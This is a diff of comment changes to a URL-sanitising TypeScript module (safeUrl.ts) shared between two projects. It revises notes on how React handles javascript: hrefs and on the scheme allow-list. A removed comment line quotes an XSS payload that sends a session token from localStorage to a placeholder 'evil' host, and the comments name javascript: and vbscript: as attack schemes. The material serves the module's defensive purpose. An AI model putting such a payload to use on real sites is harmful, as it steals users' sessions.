@@ -1,52 +1,42 @@
-// Ported verbatim from CancerBot: ui.v2/client/lib/safeUrl.ts
-// (cancerbot-org/cancerbot#5045, which extracted it after two copies drifted).
+// Ported from CancerBot's canonical shared/safeUrl.ts (#5045).
+// Comment sync: CancerBot commit 85feb7fcb9b5ddaea2813be43e79f0d5ed4ed60e,
+// cancerbot-org/cancerbot#5436 / #5439, following the React 19 migration #5289.
 //
-// Kept byte-identical below this header on purpose. A diff between the two
-// repositories should mean "someone changed the rule", not "someone tidied the
-// copy" -- drift between duplicates is the defect #5045 existed to fix, and the
-// same argument applies across repositories.
+// The body beginning "A URL that arrives from the API" stays byte-identical to
+// the corresponding section of that source. Only comments changed in this sync;
+// safeHref/safeRedirect, their allow-list and two-base resolution are unchanged.
 //
-// `safeRedirect` is unused in EXACT today: nothing here navigates to a
-// server-supplied URL. It is kept so this stays a copy rather than a variant,
-// and so a future navigation sink gets the right tool instead of a new one.
+// `safeRedirect` is unused in EXACT today. It is retained for source parity,
+// rather than maintaining a different variant of the rule in this repository.
 //
-// EXACT's use is #406: `TrialDetailPage` renders `data.link` from the trials
-// corpus straight into an `href`.
+// EXACT's use is #406: TrialDetailPage's NctLink gates the anchor on safeHref's
+// result before rendering the corpus-supplied data.link.
 //
-// TWO STATEMENTS IN THE PORTED BODY BELOW ARE CANCERBOT-TRUE AND EXACT-FALSE.
-// They are corrected here rather than edited there, so the copy stays a copy:
+// The React-version explanation below applies to both repositories: React 19
+// blocks javascript: hrefs, but that does not replace the product URL policy.
 //
-//  1. "React ... has only *warned* about `javascript:` since 16.9 -- it still
-//     renders it." True of CancerBot's ui.v2 (React 18.3.1). EXACT is on React
-//     19, which BLOCKS it: `sanitizeURL` rewrites a `javascript:` href to
-//     `javascript:throw new Error('React has blocked a javascript: URL...')`,
-//     and the 16.9 warning string is gone from the build. So here the
-//     `javascript:` half is already handled by the framework, and what this
-//     module adds is `data:`, `blob:`, and the protocol-relative and
-//     authority-naming spellings React never inspects. Tracked upstream as
-//     cancerbot-org/cancerbot#5289 (migrate ui.v2 to React 19), which would
-//     make the sentence true in one place instead of per directory.
-//
-//  2. "`ftp`/`ftps` are here because the API stores these fields as a DRF
-//     `URLField`, whose validator accepts them." That describes CancerBot's
-//     `StudyInfo.link`/`study_url`. EXACT's field is `Trial.link`, a plain
-//     `models.TextField(default='')` with NO validator at all -- which argues
-//     for this module more strongly than the sentence it replaces, not less.
-//     Whether the allow-list should be narrowed to http/https belongs upstream
-//     where the module lives, not in a one-repository fork of the rule.
+// Repository-specific notes in the copied body describe CancerBot. In particular,
+// the DRF URLField rationale for ftp/ftps refers to CB's StudyInfo fields, not
+// EXACT's Trial.link: ours is models.TextField(default='') with no URL validator.
+// Keep the shared allow-list here; narrowing it is a separate policy change,
+// not part of synchronising React-version comments. The auth-redirect examples
+// in safeRedirect's documentation are also CancerBot-specific.
 
 // A URL that arrives from the API is not automatically safe to put in an `href`.
-// React escapes text but does not validate schemes, and has only *warned* about
-// `javascript:` since 16.9 — it still renders it. Trial links are written
-// upstream, so `javascript:fetch('//evil/?t='+localStorage.token)` in a
-// `studyUrl` is a click away from the session token (#4955, same threat model as
-// the tooltip XSS in #4932/#4934).
+// React 18 only warned about `javascript:` URLs; React 19 blocks them. That is
+// not a replacement for this guard: React still allows `data:` and does not
+// enforce our scheme or same-site-relative-link policy. Trial links are written
+// upstream, so validate them before rendering (#4955, same threat model as the
+// tooltip XSS in #4932/#4934).
 
 // Schemes a link in this product may use. `ftp`/`ftps` are here because the API
 // stores these fields as a DRF `URLField`, whose validator accepts them — leaving
 // them out would silently turn valid stored links into inert text. None of the
-// five can execute script. `data:` and `blob:` are absent deliberately, and
-// `javascript:`/`vbscript:` are the attack.
+// six — http, https, ftp, ftps, mailto, tel — can execute script. (This said
+// "five" from #4955 until #5045; the set has always had six members, and a
+// count nobody can check against the line below is worse than no count.)
+// `data:` and `blob:` are absent deliberately, and `javascript:`/`vbscript:`
+// are the attack.
 const ALLOWED_SCHEMES = new Set(['http:', 'https:', 'ftp:', 'ftps:', 'mailto:', 'tel:']);
 
 // Does the value carry its own scheme? Anything that does not has to prove it is
